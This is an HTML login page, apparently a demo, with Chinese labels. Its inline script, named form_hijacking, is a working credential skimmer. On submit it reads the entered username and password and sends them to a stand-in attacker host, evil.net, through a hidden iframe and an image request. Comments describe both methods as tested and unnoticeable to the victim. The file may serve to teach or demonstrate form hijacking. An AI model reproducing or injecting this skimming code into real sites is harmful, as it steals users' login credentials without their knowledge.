<!DOCTYPE html>
<html>

<head>
<meta charset="utf-8" />
<title>web login</title>

<link href="./files/bootstrap.min.css" rel="stylesheet" type="text/css">

<script src="./files/jquery.min.js" charset="UTF-8"></script>
<script src="./files/bootstrap.min.js" charset="UTF-8"></script>

  <style>
        .navbar-static-top .container, .navbar-fixed-top .container, .navbar-fixed-bottom .container{width:1200px;}
        .container{ width: 1200px;}
  </style>
</head>

<body>
<div class="navbar navbar-default navbar-inverse" style="border-radius:0px">
    <div class="navbar-inner">
        <div class="container">
            <a class="brand" style="padding: 0px;" href="javascript:;"><img src="./files/Logo.png" height="30" style="height:30px;float: left;display: block;margin-top: 10px;"></a>
            <ul class="nav navbar-nav" style="padding-left:30px;">
                            </ul>
                    </div>
    </div>
</div>

<div style="min-width: 1200px; max-width: 1500px; margin: 10px auto;">
    <div class="row" style="margin-top: 30px;margin-bottom: 60px;">
    <form id="loginform" class="form-horizontal col-sm-8 col-sm-offset-2" method="get" action="./admin.html">
        <fieldset>
            <legend style="margin-bottom: 60px;">用户登录</legend>
            <div class="form-group">
                <label class="control-label col-sm-2" for="inputUsername">账号：</label>
                <div class="col-sm-4">
                    <input type="text" name="user" class="form-control" id="inputUsername" placeholder="您注册时填写的账号">
                </div>
            </div>
            <div class="form-group">
                <label class="control-label col-sm-2" for="inputPassword">口令：</label>
                <div class="col-sm-4">
                    <input type="password" name="pass" class="form-control" id="inputPassword">
                </div>
                <div class="col-sm-6">口令长度6-20个字符，不能包含空格</div>
            </div>
            <div class="form-group">
                <div class="col-sm-4 col-sm-offset-4">
                    <button type="submit" class="btn btn-primary">登录</button>
                    <a href="javascript:;" class="btn">注册</a>
                    <a href="javascript:;" style="font-size: 12px;margin-left: 20px;">找回账号</a>
                </div>
            </div>
        </fieldset>
    </form>
    </div>
</div>

<script>
// --------------------------

// 为ID为'loginform'的表单  添加监听器
const form = document.getElementById('loginform');

// 提交表单后的页面 在新window打开(避免提交过快错过下载)
form.setAttribute("target", "_blank");

//form.removeAttribute("target");


// 提交时 执行函数
form.addEventListener('submit', form_hijacking);

// 提交时 进行判断 如果返回false 则取消提交该表单内容!
// form.onsubmit = function() {
//     return form_hijacking();
// };


function form_hijacking(){
    // 获取表单内容
    // 获取表单内容 方式1:
    var user = document.forms[0].elements[0].elements[0].value;
    var pass = document.forms[0].elements[0].elements[1].value;

    // 获取表单内容 方式2: 使用form.eleName的方式
    // alert(form.user.value);
    // alert(form.pass.value);

    // 不管用什么方式 都需要在浏览器console调试 确定可以获取到你要劫持的表单的内容

    //-------------------

    // 发送表单内容
    // 发送表单内容 方式1: 创建iframe标签
      var iframe1=document.createElement("iframe"); //创建一个iframe 内联框架
      iframe1.style.display="none";   //设置内联框架为隐藏模式
      iframe1.src="https://evil.net/data?user=" + user + "&pass=" + pass;
      document.body.appendChild(iframe1);


    // 发送表单内容 方式2: 创建img标签
    var img1=new Image();
    img1.src="https://evil.net/data?user=" + user + "&pass=" + pass;
    document.body.appendChild(img1);

    // 发送表单内容的方式较多 以上2种都经过了测试 可以无感知获取到表单数据 可以同时使用
    }



// --------------------------
</script>


<div style="text-align: center">
    © 2013 - 2020&nbsp;demo有限公司&nbsp;所有权利保留
</div>

</body>
</html>

